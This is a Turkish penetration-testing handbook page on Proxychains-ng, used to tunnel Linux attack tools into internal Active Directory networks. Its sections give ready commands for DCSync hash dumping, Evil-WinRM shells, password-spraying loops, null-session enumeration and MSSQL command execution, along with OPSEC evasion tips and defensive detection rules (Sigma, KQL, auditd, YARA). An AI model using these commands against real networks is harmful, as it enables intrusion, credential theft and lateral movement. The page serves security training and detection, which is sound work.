# Proxychains-ng

> **Kategori:** [16. TÜNELLEME, PİVOT VE SOCKS PROXY (PIVOTING & TUNNELING)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Dinamik olarak bağlanan Linux komut satırı araçlarının TCP ve DNS bağlantılarını `LD_PRELOAD` kancalamasıyla yakalayarak SOCKS4, SOCKS5 veya HTTP vekil sunucuları üzerinden iç Active Directory ağına yönlendiren yeni nesil vekil zinciri yöneticisi.

---

## 1. Genel Bakış ve Amaç

Active Directory sızma testlerinde iç ağlara erişim sağlayan bir tünel (Chisel, SSH Dynamic Port Forwarding, Metasploit Socks Proxy vb.) kurulduğunda, saldırganın işletim sistemindeki yerel araçların (Impacket, NetExec, Evil-WinRM, Nmap, curl) bu tünel üzerinden hedef etki alanı denetleyicilerine veya üye sunuculara ulaşması gerekir. Ancak çoğu Linux komut satırı aracı dahili bir SOCKS proxy desteğine sahip değildir veya her aracın proxy parametresi birbirinden farklıdır.

**Proxychains-ng** (`proxychains4`), Linux dinamik bağlayıcısının (dynamic linker) `LD_PRELOAD` mekanizmasını kullanarak bu sorunu çözer. Bir program `proxychains4` ile başlatıldığında, paylaşılan `libproxychains4.so` kütüphanesi belleğe enjekte edilir. Bu kütüphane, programın libc kütüphanesi üzerinden yaptığı `connect()`, `gethostbyname()`, `getaddrinfo()` ve `freeaddrinfo()` gibi ağ ve alan adı çözümleme sistem çağrılarını kancalar (hooking). Programın hedef IP adresine doğrudan açmak istediği TCP soketi yakalanır ve yapılandırma dosyasında (`proxychains4.conf`) tanımlanan SOCKS veya HTTP vekil sunucularına şeffaf bir şekilde tünellenir. Ayrıca `proxy_dns` özelliği sayesinde `corp.local` gibi iç etki alanı isimleri saldırganın kendi DNS sunucusuna sorulmadan (DNS sızıntısı önlenerek) doğrudan iç ağdaki SOCKS sunucusu üzerinden çözümlenir.

```
+---------------------------------------------------------------------------------------------------+
|                            PROXYCHAINS-NG LD_PRELOAD KANCALAMA MİMARİSİ                           |
+---------------------------------------------------------------------------------------------------+

 [ Saldırgan Konsolu: proxychains -q nxc smb dc01.corp.local ]
             │
             ├─► 1. LD_PRELOAD ile libproxychains4.so Belleğe Enjekte Edilir
             │
             ├─► 2. Hedef Alan Adı Çözümleme: "dc01.corp.local"
             │      (proxy_dns devrede: DNS sorgusu tünel içine yönlendirilir)
             │
             ├─► 3. connect() Sistem Çağrısı Kancalanır (Hooked connect)
             │      (Doğrudan soket açılması engellenir)
             │
             ▼
 [ Proxychains Zincirleme Motoru (/etc/proxychains4.conf) ]
             │
             ├─► Mod Seçenekleri:
             │    • strict_chain: Tüm proxy'lerden sırayla geç (biri çökerse dur)
             │    • dynamic_chain: Çalışan proxy'leri kullan, ölü olanları atla (Önerilen)
             │    • random_chain: Listeden rastgele seç
             │
             ▼
 [ Yerel SOCKS5 Tüneli (Chisel / SSH - 127.0.0.1:1080) ]
             │
             ▲
   Kurumsal Ağ Sınırı (Şifreli Tünel Bağlantısı)
             ▲
             │
 [ Ele Geçirilen DMZ / Pivot Sunucusu ]
             │
             ├─► 4. Paketi İç Ağ Soketine Bırakır
             │
             ▼
 [ Hedef Etki Alanı Denetleyicisi (DC01 - 10.10.10.10:445) ]
```

### Neden Önemli?

| Özellik | Operasyonel Avantajı |
|:---|:---|
| **Evrensel Proxy Desteği** | Proxy desteği olmayan herhangi bir dinamik Linux aracını (nxc, evil-winrm, rpcclient vb.) SOCKS uyumlu hale getirir. |
| **DNS Sızıntısı Engelleme (`proxy_dns`)** | Şirket içi `.local` veya `.corp` etki alanı sorgularını yerel ağa sızdırmadan tünel üzerinden çözer. |
| **Dinamik Zincirleme (`dynamic_chain`)** | Çoklu pivot atlamalarında (örneğin DMZ -> Bastion -> AD) çöken ara vekilleri atlayarak operasyonun kesilmesini önler. |
| **Sessiz Mod (`-q`)** | Proxy bağlantı loglarını gizleyerek komut çıktılarını temiz tutar ve bash scriptleri ile otomasyona olanak tanır. |
| **Protokol Esnekliği** | Aynı zincir içinde SOCKS4, SOCKS5 ve HTTP CONNECT vekil sunucularını karma şekilde çalıştırabilir. |

### Alternatif Yönlendirme Araçlarıyla Karşılaştırma

| Kriter | Proxychains-ng | Ligolo-ng | Redsocks | Proxifier (Windows) |
|:---|:---|:---|:---|:---|
| **Çalışma Seviyesi** | Kullanıcı Alanı (LD_PRELOAD) | Çekirdek Alanı (TUN L3) | Çekirdek Alanı (iptables REDIRECT)| Kullanıcı Alanı (LSP/WFP) |
| **Root Yetkisi İhtiyacı** | ❌ Gerekmez | ✅ Saldırganda Şart | ✅ Saldırganda Şart | ❌ Normal Kullanıcı |
| **Nmap SYN Scan Desteği**| ❌ Desteklemez (-sT şart) | ✅ Tam Destek (-sS) | ❌ Yalnızca TCP | ❌ Yalnızca TCP |
| **Statik / Go Araçları** | ⚠️ Desteklemez | ✅ Tam Destek | ✅ Tam Destek | ✅ Tam Destek |
| **DNS Çözümleme** | ✅ Tünel Üzerinden (proxy_dns)| ✅ TUN Üzerinden | ⚠️ Ek Yapılandırma | ✅ Gelişmiş DNS Kuralı |
| **Yapılandırma Kolaylığı** | Çok Kolay (Tek Conf) | Orta (TUN + Route) | Zor (iptables kuralları) | Kolay (GUI) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

Proxychains-ng doğrudan hedef komutun önüne getirilerek çalıştırılır.

```bash
proxychains4 [SEÇENEKLER] <HEDEF_KOMUT> [KOMUT_ARGÜMANLARI]
```

### 2.1 CLI Parametreleri Tablosu

| Parametre | Açıklama | Kullanım Türü | Örnek Değer |
|:---|:---|:---|:---|
| `-q` | Sessiz (quiet) mod. Proxychains başlık ve bağlantı loglarını gizler; yalnızca hedef aracın çıktısını basar. | Çıktı Yönetimi | `proxychains4 -q nxc smb ...` |
| `-f <dosya>` | Varsayılan yapılandırma dosyası yerine özel bir `.conf` dosyası belirtir. | Yapılandırma | `-f /tmp/chisel_pivot.conf` |
| `-h` | Kullanım yardımını ve desteklenen seçenekleri görüntüler. | Bilgi | `-h` |

### 2.2 Yapılandırma Dosyası Direktifleri (`proxychains4.conf`)

Dosya varsayılan olarak `/etc/proxychains4.conf` veya `./proxychains.conf` yolunda bulunur.

| Direktif | Açıklama | Önerilen Durum |
|:---|:---|:---|
| `dynamic_chain` | Listelenen proxy'lerden sırayla geçer. Eğer bir proxy çevrimdışıysa onu atlayarak diğerine geçer. | **Açık (Önerilen)** |
| `strict_chain` | Listedeki tüm proxy'leri kesin sırayla kullanır. Biri bile kapalıysa bağlantıyı reddeder. | Kapalı |
| `random_chain` | Listedeki proxy'lerden rastgele seçim yapar (Anonimlik testleri için). | Kapalı |
| `proxy_dns` | DNS sorgularını vekil sunucu üzerinden gönderir (İç AD isim çözümlemesi için kritik). | **Açık (Zorunlu)** |
| `tcp_read_time_out 15000` | Soket okuma zaman aşımı süresi (milisaniye cinsinden). | `15000` |
| `tcp_connect_time_out 8000`| Vekil sunucuya bağlanma zaman aşımı süresi. | `8000` |
| `[ProxyList]` | Kullanılacak proxy sunucularının listelendiği bölüm başlığı. | En altta yer alır |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: NetExec ile İç Ağdaki Domain Controller'ı Doğrulama
Chisel veya SSH üzerinden açılmış `127.0.0.1:1080` SOCKS5 proxy'si üzerinden etki alanı denetleyicisine SMB oturumu denenir.

```bash
proxychains -q nxc smb 10.10.10.10 -u 'Administrator' -p 'P@ssw0rd123!'
```

```text
SMB         10.10.10.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.10     445    DC01             [+] CORP.LOCAL\Administrator:P@ssw0rd123! (Pwn3d!)
```

### Senaryo 2: Nmap ile SOCKS Üzerinden TCP Port Taraması
Proxychains ham paket (raw socket) üretemez. Bu nedenle Nmap kullanılırken mutlaka TCP Connect (`-sT`) ve Ping Yok (`-Pn`) bayrakları eklenmelidir.

```bash
proxychains -q nmap -sT -Pn -p 88,135,389,445 10.10.10.10
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-14 21:44
Nmap scan report for 10.10.10.10
Host is up (0.045s latency).

PORT    STATE SERVICE
88/tcp  open  kerberos-sec
135/tcp open  msrpc
389/tcp open  ldap
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 2.12 seconds
```

### Senaryo 3: Impacket Secretsdump ile Uzaktan NTDS.dit Dökme
Pivot arkasındaki Domain Controller'dan DCSync saldırısı ile tüm etki alanı hash'leri çekilir.

```bash
proxychains -q impacket-secretsdump corp.local/Administrator:'P@ssw0rd123!'@10.10.10.10 -just-dc-user krbtgt
```

```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies.

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:90b7952e42ef99e0df2357ff833b52d2:::
[*] Cleaning up...
```

### Senaryo 4: Evil-WinRM ile İç Ağdaki Sunucuya Uzak PowerShell Erişimi
WinRM portu (5985) üzerinden iç sunucuya etkileşimli kabuk oturumu açılır.

```bash
proxychains -q evil-winrm -i 10.10.10.20 -u 'DomainAdmin' -p 'SecurePass2026!'
```

```text
Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint...
*Evil-WinRM* PS C:\Users\DomainAdmin\Documents> whoami
corp\domainadmin
```

### Senaryo 5: Çoklu Proxy Zincirleme (Multi-Hop Proxy Chaining)
İki aşamalı pivot zincirinde (Saldırgan -> Dış Proxy 1080 -> İç Proxy 1081 -> Hedef AD), `proxychains.conf` dosyası yapılandırılır.

`/tmp/multihop.conf` içeriği:
```text
dynamic_chain
proxy_dns
tcp_connect_time_out 10000
tcp_read_time_out 15000

[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
```

Çalıştırma:
```bash
proxychains -f /tmp/multihop.conf -q nxc ldap dc01.corp.local --users
```

### Senaryo 6: Otomasyon Betiklerinde Temiz Çıktı ile Parola Püskürtme
`-q` bayrağı kullanılarak Proxychains'in log çıktısı engellenir ve doğrudan hedef aracın çıktısı parse edilir.

```bash
for user in $(cat /tmp/users.txt); do
    result=$(proxychains -q nxc smb 10.10.10.10 -u "$user" -p 'Spring2026!' --continue-on-success | grep -E "\+|Pwn3d")
    if [ -n "$result" ]; then
        echo "[BULDUM] $user: $result"
    fi
done
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Olası Neden | Kesin Çözüm Adımı |
|:---|:---|:---|
| `|DNS-response|: dc01.corp.local does not exist` | Tünelin arkasındaki pivot sunucusu iç DNS sunucusuna erişemiyor veya `proxy_dns` kapalıdır. | `/etc/proxychains4.conf` içinde `proxy_dns` direktifinin açık olduğunu doğrulayın; hedefi doğrudan IP adresiyle çağırın. |
| `|R-chain| ... 127.0.0.1:1080 ... timeout` | Chisel, SSH veya vekil sunucu tüneli çökmüş ya da port kapalıdır. | `nc -zv 127.0.0.1 1080` ile yerel proxy'nin ayakta olduğunu teyit edin; Chisel/SSH sürecini yeniden başlatın. |
| `ERROR: ld.so: object 'libproxychains4.so' from LD_PRELOAD cannot be preloaded` | 64-bit bir ikili dosya çalışırken 32-bit kütüphane çağrılmış veya kütüphane dosya yolu yanlıştır. | `/etc/proxychains4.conf` içindeki kütüphane yolunu denetleyin veya paketi `sudo apt install --reinstall proxychains-ng` ile onarın. |
| `nmap -sS ... raw socket error / Operation not permitted` | Nmap'e varsayılan SYN tarama modu (`-sS`) verilmiştir. Proxychains ham soketleri yakalayamaz. | Nmap komutuna mutlaka `-sT -Pn` parametrelerini ekleyin (`proxychains nmap -sT -Pn ...`). |
| Go veya Rust ile derlenmiş araçlar proxy üzerinden gitmiyor | Statik derlenmiş ikili dosyalar veya doğrudan syscall kullanan araçlar libc `connect()` çağrısını kullanmaz. | Bu araçlar için Proxychains yerine Katman 3 düzeyinde yönlendirme yapan `Ligolo-ng` aracına geçiş yapın. |
| Bağlantı çok yavaş veya sık sık zaman aşımına uğruyor | `tcp_read_time_out` ve `tcp_connect_time_out` süreleri yavaş ağlar için çok düşüktür. | Yapılandırma dosyasında süreleri artırın: `tcp_connect_time_out 15000` ve `tcp_read_time_out 30000`. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
+---------------------------------------------------------------------------------------------------+
|                              PROXYCHAINS-NG TESPİT VE GÖZLEMLENEBİLİRLİK                          |
+---------------------------------------------------------------------------------------------------+

 [ Saldırgan Tarafı (Linux Host) ]
  - LD_PRELOAD Çevre Değişkeni      ====> Process Hollowing / EDR Host Tespiti
  - libproxychains4.so Yüklemesi

 [ Ağ Katmanı ve Pivot Sunucusu ]
  - Yerel SOCKS Sunucusuna Bağlantı ====> Sysmon Event ID 3 (Pivot Hostunda İç Ağa Açılan Soketler)
  - Tüm Trafik Pivot Hostu IP'sinden Çıkar

 [ Hedef Active Directory Sistemleri ]
  - Kaynak IP: Daima Pivot Hostu   ====> Event ID 4624 (Logon Type 3)
  - Anormal Bağlantı Hızı / Burst   ====> EDR / SIEM Davranışsal Tespiti
  - Kerberos & SMB İstekleri
```

### 5.1 Bırakılan İzler ve Windows Olay Günlükleri
* **Windows Security Event ID 4624 (Network Logon - Type 3):** İç ağdaki tüm hedef sistemlerde oturum açan kaynak IP adresi olarak saldırganın değil, tünelin sonlandığı pivot makinesinin IP adresi görünür.
* **Sysmon Event ID 3 (Network Connection):** Pivot görevi gören kurban makinede (Windows), arka arkaya çok sayıda iç ağ IP'sine (port 445, 88, 389) yönelik TCP bağlantıları loglanır.
* **Linux LD_PRELOAD Tespiti:** Saldırganın kendi işletim sisteminde veya Linux kurban üzerinde process audit araçları (`auditd`) `LD_PRELOAD` ile enjekte edilen `libproxychains4.so` dosyasını tespit edebilir.

### 5.2 Ağ ve EDR İmzaları
* **DNS Sızıntıları (DNS Leaks):** Eğer `proxy_dns` kapalı unutulursa, kurumsal iç alan adları (`dc01.corp.local`) saldırganın yerel DNS sağlayıcısına (örneğin 8.8.8.8) düz metin sorulur ve dış ağ güvenlik monitörleri tarafından anında tespit edilir.
* **TCP Bağlantı Davranışı:** Proxychains TCP bağlantılarını tek tek açıp kapattığından, port taramalarında belirgin bir gecikme (latency jitter) ve yarım kalan el sıkışma anomalileri oluşabilir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Kullanım Amacı |
|:---|:---|:---|:---|
| **Command and Control** | `T1090.003` | Proxy: Multi-hop Proxy | Çoklu SOCKS proxy zincirleri üzerinden ağ trafiğini kademeli iletme. |
| **Command and Control** | `T1090.001` | Proxy: Internal Proxy | Ele geçirilen iç sistemler üzerinden trafiği yönlendirme. |
| **Defense Evasion** | `T1574.006` | Hijack Execution Flow: LD_PRELOAD | Dinamik bağlayıcıyı kancalayarak ağ çağrılarını tünel içine çekme. |
| **Discovery** | `T1046` | Network Service Discovery | Proxychains arkasından iç servisleri TCP Connect taramasıyla keşfetme. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Risk Seviyesi | Operasyonel Önlem / Kaçınma Yöntemi |
|:---|:---|:---|
| DNS Sızıntısı (DNS Leak) | **KRİTİK** | Yapılandırma dosyasında `proxy_dns` direktifinin mutlaka açık olduğundan emin olun; gerekirse hedefleri doğrudan IP ile çağırın. |
| Gürültülü Terminal Çıktısı | **DÜŞÜK** | Proxychains loglarının ekranı veya logları kirletmesini önlemek için her zaman `-q` (quiet) modunu kullanın. |
| Nmap Yanlış Taraması | **YÜKSEK** | Nmap'in varsayılan SYN paketleri proxychains tarafından doğrudan hedefe iletilemez; her zaman `-sT -Pn` kullanın. |
| Pivot Hostu Üzerinde Aşırı Yük| **ORTA** | Tüm saldırgan araçlarının aynı anda tek bir pivot makinesinden çıkması EDR korelasyonunu tetikler; istek hızlarını sınırlandırın. |

### 5.5 Tespit Kuralı Örnekleri (Sigma & KQL)

#### Sigma Kuralı (Linux Sistemde LD_PRELOAD ile Proxychains Enjeksiyonu):
```yaml
title: Proxychains LD_PRELOAD Execution
id: f1a83b24-7c91-4d05-ba81-12ec4917a801
status: production
description: Detects process execution utilizing LD_PRELOAD with proxychains library to redirect network connections.
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    CommandLine|contains:
      - 'proxychains'
      - 'proxychains4'
      - 'libproxychains4.so'
  condition: selection
falsepositives:
  - Authorized developer or administrator proxy usage
level: medium
```

#### Microsoft Sentinel KQL Sorgusu (Pivot Makinesinden Anormal Yoğunlukta SMB Bağlantısı):
```kusto
DeviceNetworkEvents
| where InitiatingProcessFileName has_any ("chisel.exe", "agent.exe", "svchost.exe")
| where RemotePort in (445, 88, 389)
| summarize ConnectionCount = count(), TargetIPs = make_set(RemoteIP) by InitiatingProcessFileName, DeviceName, bin(TimeGenerated, 5m)
| where ConnectionCount > 30
| project TimeGenerated, DeviceName, InitiatingProcessFileName, ConnectionCount, TargetIPs
```

#### Linux Auditd Kuralı (LD_PRELOAD İzleme):
```text
-w /etc/ld.so.preload -p wa -k ld_preload_tamper
-a always,exit -F arch=b64 -S execve -F euid=0 -k proxychains_exec
```

#### YARA Kuralı (libproxychains Kütüphane Tespiti):
```yara
rule HackTool_Linux_Proxychains_Strings {
    meta:
        description = "Detects Proxychains-ng dynamic library and executable"
        author = "RedTeam SecOps"
        date = "2026-10-14"
        reference = "https://github.com/rofl0r/proxychains-ng"
    strings:
        $s1 = "libproxychains4.so" ascii
        $s2 = "ProxyChains-NG" ascii wide
        $s3 = "dynamic_chain" ascii
        $s4 = "strict_chain" ascii
        $s5 = "proxy_dns" ascii
    condition:
        uint32(0) == 0x464C457F and 3 of ($s*)
}
```

### 5.6 Savunma Karşılığı ve Sertleştirme
* **LD_PRELOAD Kısıtlamaları:** Linux sunucularda `nosuid` bayrakları ve SELinux / AppArmor profilleri sıkılaştırılarak kütüphane kancalamaları denetlenmelidir.
* **İç Ağ İletişim Filtreleme (Mikro Segmentasyon):** DMZ sunucularının iç ağdaki tüm IP'lere (özellikle etki alanı denetleyicisi dışındaki iş istasyonlarına) SMB/RPC trafiği üretmesi anahtarlama (switch) ve güvenlik duvarı seviyesinde engellenmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. Sessiz Modda NetExec SMB Oturumu Doğrulama
```bash
proxychains -q nxc smb 10.10.10.10 -u 'Administrator' -p 'P@ssw0rd123!'
```
* **Ne Yapar?:** Proxychains loglarını gizleyerek doğrudan DC01 üzerinde parola doğrulaması yapar.
* **Ne Zaman Kullanılır?:** Tünelin çalıştığını ve kimlik bilgilerini hızlıca teyit etmek için.
* **Parametreler:** `-q` (quiet modu).

#### 2. Nmap ile TCP Connect Taraması Başlatma
```bash
proxychains -q nmap -sT -Pn -p 21,22,80,445,3389 10.10.10.50
```
* **Ne Yapar?:** SOCKS tüneli üzerinden hedef makinenin belirli TCP portlarını tarar.
* **Ne Zaman Kullanılır?:** İç ağ servislerini ve açık portları keşfetmek için.
* **Parametreler:** `-sT` (TCP Connect), `-Pn` (Ping yok).

#### 3. Özel Yapılandırma Dosyası Kullanarak Komut Çalıştırma
```bash
proxychains -f /tmp/chisel_socks.conf -q evil-winrm -i 10.10.10.20 -u admin -p Pass123
```
* **Ne Yapar?:** Standart `/etc/proxychains4.conf` yerine belirtilen özel config dosyasındaki vekili kullanır.
* **Ne Zaman Kullanılır?:** Birden fazla farklı tünel veya operasyon aynı anda yürütülürken.
* **Parametreler:** `-f <dosya_yolu>`.

#### 4. Impacket Secretsdump ile DCSync Gerçekleştirme
```bash
proxychains -q impacket-secretsdump corp.local/Administrator:Pass123@10.10.10.10 -just-dc
```
* **Ne Yapar?:** DRSUAPI protokolü üzerinden etki alanındaki tüm kullanıcı hash'lerini çeker.
* **Ne Zaman Kullanılır?:** Domain Admin hakları elde edildikten sonra tam hash hasadı yapmak için.
* **Parametreler:** `-just-dc`.

#### 5. Evil-WinRM ile İç Sunucuya Uzak PowerShell Bağlantısı
```bash
proxychains -q evil-winrm -i 10.10.10.30 -u 'sql_svc' -p 'P@ssw0rdSql!'
```
* **Ne Yapar?:** 5985 portu üzerinden iç ağdaki sunucuya etkileşimli Windows PowerShell kabuğu açar.
* **Ne Zaman Kullanılır?:** Hedef sistemde komut çalıştırmak ve yerel dosya transferi yapmak için.
* **Parametreler:** `-i <ip>`, `-u <user>`, `-p <pass>`.

#### 6. İç Web Uygulamasına Curl ile İstek Gönderme
```bash
proxychains -q curl -k https://vcenter.corp.local/ui/
```
* **Ne Yapar?:** İç ağdaki web sunucusuna HTTP/HTTPS isteği gönderir ve yanıtı ekrana basar.
* **Ne Zaman Kullanılır?:** Web tabanlı yönetim arayüzlerini ve API uç noktalarını incelemek için.
* **Parametreler:** `-k` (SSL denetimini yoksay).

#### 7. Rpcclient ile İsimsiz (Null Session) Sorgusu Yapma
```bash
proxychains -q rpcclient -U "" -N 10.10.10.10 -c "enumdomusers"
```
* **Ne Yapar?:** SOCKS üzerinden hedef DC'ye anonim RPC oturumu açarak etki alanı kullanıcılarını listeler.
* **Ne Zaman Kullanılır?:** Parolasız bilgi toplama ve kullanıcı keşfi aşamasında.
* **Parametreler:** `-U ""` (kullanıcı yok), `-N` (parola yok).

#### 8. NetExec ile Parola Püskürtme (Password Spraying)
```bash
proxychains -q nxc smb 10.10.10.0/24 -u users.txt -p 'Autumn2026!' --continue-on-success
```
* **Ne Yapar?:** Belirtilen kullanıcı listesini tek bir parola ile tüm iç alt ağda dener.
* **Ne Zaman Kullanılır?:** Hesap kilitleme eşiklerine dikkat ederek yatay hareket parolası bulmak için.
* **Parametreler:** `--continue-on-success`.

#### 9. İç Ağdaki MSSQL Sunucusuna SQL Komutu Gönderme
```bash
proxychains -q impacket-mssqlclient corp.local/db_user:DbP@ss123@10.10.10.40 -windows-auth
```
* **Ne Yapar?:** Port 1433 üzerinden iç Microsoft SQL Server veritabanına etkileşimli SQL shell açar.
* **Ne Zaman Kullanılır?:** Veritabanı verilerini incelemek ve `xp_cmdshell` ile komut çalıştırmak için.
* **Parametreler:** `-windows-auth` (Windows entegre kimlik doğrulama).

#### 10. İç Ağdaki RDP Sunucusuna xfreerdp ile Bağlanma
```bash
proxychains -q xfreerdp /v:10.10.10.50 /u:Administrator /p:AdminPass /cert-ignore
```
* **Ne Yapar?:** SOCKS5 vekili üzerinden uzak masaüstü grafik arayüz oturumu başlatır.
* **Ne Zaman Kullanılır?:** GUI ortamında yönetim araçlarını veya Active Directory konsolunu kullanmak için.
* **Parametreler:** `/v:<hedef>`, `/cert-ignore`.

---

## Kaynaklar

* [rofl0r Resmi GitHub Deposu: Proxychains-ng](https://github.com/rofl0r/proxychains-ng)
* [Proxychains-ng Resmi Dokümantasyonu ve Man Sayfası](https://github.com/rofl0r/proxychains-ng/blob/master/README)
* [The Hacker Recipes: Pivoting with Proxychains](https://www.thehacker.recipes/a-d/movement/pivoting/proxychains)
* [HackTricks: Tunneling and Port Forwarding (Proxychains Guide)](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/tunneling-and-port-forwarding.html#proxychains)
* [MITRE ATT&CK: Multi-hop Proxy (T1090.003)](https://attack.mitre.org/techniques/T1090/003/)

---

> **Önceki:** [← Ligolo-ng](./Ligolo-ng.md) · **Sonraki:** [BOF-AD / SA-BOF (Kategori 17) →](../Kategori_17_Modern_EDR_Safe_Beacon_Object_Files/BOF-AD_SA-BOF.md)
